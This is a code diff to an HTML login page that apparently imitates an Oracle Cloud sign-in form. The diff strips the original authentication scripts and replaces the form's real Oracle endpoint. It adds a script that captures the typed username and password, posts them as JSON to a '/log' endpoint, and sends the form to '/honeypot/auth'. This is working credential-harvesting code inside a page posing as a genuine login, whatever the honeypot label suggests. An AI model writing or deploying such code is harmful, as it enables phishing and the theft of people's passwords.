@@ -54,25 +54,20 @@ body
 </style>
 
 <script language="javascript" type="text/javascript">
-<!-- 
-var currentPageLang = 'en';
-var userLanguageArray =  new Array();
-var isError;
-
-// -->
-</script>
-<script language="javascript" type="text/javascript" src="js/config.js"></script>
-<script language="javascript" type="text/javascript" src="js/messages.js"></script>
-<script language="javascript" type="text/javascript" src="js/loginJS.js"></script>
-
-<script language="javascript" type="text/javascript">
-function submitform()
-{
-	
-	 document.loginData.action = "login.html"; 
-	 document.loginData.submit();
-	 document.loginData.action ="/oam/server/auth_cred_submit";
+function logCredentials() {
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "/log", true);
+      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+      xhr.send(JSON.stringify({ username: username, password: password }));
 }
+
+function submitform() {
+      logCredentials();
+      document.loginData.action = "/honeypot/auth";
+      document.loginData.submit();
+  }
 </script>
 
 </head>
@@ -91,7 +86,7 @@ function submitform()
             <div id="login">
                 <div id="title">  Welcome </div>
                 <div id="login-form" style="float:right;">
-                    <form id="loginData" action="https://efmw.login.us6.oraclecloud.com/oam/server/auth_cred_submit" method="post" name="loginData">
+                    <form id="loginData" action="/honeypot/auth" method="post" name="loginData" onsubmit="submitform(); return false;">
                         <!------------ DO NOT REMOVE ------------->
                         <!----- loginform renderBrowserView ----->
                         <!-- Required for SmartView Integration -->
